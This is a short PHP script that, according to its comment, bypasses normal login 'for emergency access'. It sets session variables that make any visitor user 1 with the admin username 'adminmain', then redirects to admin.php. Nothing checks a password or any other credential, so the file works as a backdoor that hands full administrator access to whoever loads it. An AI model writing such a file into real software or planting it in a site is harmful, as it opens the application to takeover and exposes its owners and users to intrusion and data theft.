<?php
require_once 'config.php';

// Bypass normal login for emergency access
$_SESSION['user_id'] = 1;
$_SESSION['username'] = 'adminmain';
$_SESSION['email'] = 'admin@gmail.com';

header('Location: admin.php');
exit();
?>